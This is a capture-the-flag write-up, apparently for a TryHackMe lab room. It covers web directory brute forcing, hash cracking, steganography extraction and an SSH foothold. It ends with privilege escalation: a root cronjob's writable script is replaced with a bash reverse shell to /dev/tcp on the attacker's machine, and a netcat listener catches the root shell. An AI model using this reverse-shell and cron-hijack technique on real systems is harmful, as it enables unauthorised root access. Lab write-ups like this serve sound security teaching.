# recon
Like always, start with nmap. I use my own tool to automate nmap scan, check it out [pymap](https://github.com/gu2rks/pymap)
```console
$ python3 pymap.py -t $IP --all
```
There are 3 open ports:
- 80 ngnix server
- 6498 ssh
- 65524 apache server

## port 80 ngnix 
I use `gobuster` to brute forcing web directory 
```console
$ gobuster dir -u http://$IP/ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html -t 54
```
here is what I found:
- /h______ (Status: 301)
  - /w______
- /index.html (Status: 200)
- /robots.txt (Status: 200)
The first flag is in one of the directory. Note that the flag is encoded. decode it and summit ur flag.
## port 65524 apache
Same as port 80, use `gobuster` for directory brute forcing. In the meantime I was waiting for result from go buster. I looks around and find the 3rd flag. here is what I found with gobuster.
- /index.html (Status: 200)
- /robots.txt (Status: 200)
this is odd. but let go and check what we have. I found a encoded string hidden in `/index.html`. decode it and it will give you a hidden directory call `/n0th1__________`.

moreover, in robots.txt you will find a weird string:
```
User-Agent:a1867_______________
```
I use hash analyzer to check which hash type is that. then using `hashcat` to crack it: let move back to `/n0th1__________` directory.

here you will find
```html
<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
<p>940________________________</p>
```
a picture which I guess that this picture might hiding something from us (steganography). I downloaded it and used `binwalk` to analyze the picture... didnt find anything. I then use `hexeditor` to analyze the picture. I was rigth about it, the picture include a hidden file. so I use `stegcracker` to crack it.

at this moment:
- hashcat is running
- stegcracker is running
- my laptop is screaming and burning...


back to `/n0th1__________`, this a some werid strings there too. THM give us a HINT that the string is a GOST Hash. use ur favorite search engines and find online hash cracking website. Boom! I got a password!!. 

**hint**: <details>I used this [site](https://md5hashing.net/hash/gost/)) to crack it</details>


I then stop my stegcracker. and run `steghide` to extrack a hidden file:
```console
kali@kali:~/THM$ steghide extract -sf index.jpeg 
Enter passphrase: 
wrote extracted data to "secrettext.txt".
```
At this point, we still missing flag 2. Base on what we found, the string that we found in *robots.txt* (User-Agent) should give us the flag. Since *rockyou.txt* contains only password, not thing like flag{soemthing}. Which is why my `hashcat` could not crack it. 


The solution was to find online hash cracking website. to gain 2nd flag. 

**hint:** <details> same site as GOST hash cracker.</details>

Back to the file we extracted from steghide
```console
kali@kali:~/THM$ cat secrettext.txt 
username:b____
password:
01101001 <and more>
```
note that password is in binary, decode it! now let ssh and get foothold on the victim machine.
# foot hold
let get user flag!!!
```console
boring@kral4-PC:~$ ls
user.txt
boring@kral4-PC:~$ cat user.txt 
User Flag But It Seems Wrong Like It`s Rotated Or Something
<flaghere>
```
The hint said *User Flag But It Seems Wrong Like It`s Rotated Or Something*.... **Rotated**... Find out what it mean:

**hint:** <details>ROT cipher</details>

# root
I tried to `sudo -l` but we dont have premission to do so. then I remember that it said in the room detail that *escalate your privileges through a vulnerable cronjob.* so lets do it!
```console
boring@kral4-PC:~$ cat /etc/crontab # check crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```
if you do not know what cronjob is, pls look it up. In short each 1 min a hidden bash script call `.mysecretcronjob.sh` is executed by root. the script is located at `/var/www/`. lucky the script is own by our current user which mean we have a permission to read and write the script.

The plan is modify the script (`.mysecretcronjob.sh`) to a reverse shell to gain root access. add this to the script
```sh
bash -i >& /dev/tcp/<kali ip>/6969 0>&1
```
now on your kali. open netcat and listen/wait for our reverse shell to be execute by cronjob as root:
```console
kali@kali:~$ nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.11.14.220] from (UNKNOWN) [10.10.111.241] 56080
bash: cannot set terminal process group (1741): Inappropriate ioctl for device
bash: no job control in this shell
root@kral4-PC:/var/www#
```
now go grab root flag

**Hint**:
<details>hidden hidden hidden...</details>
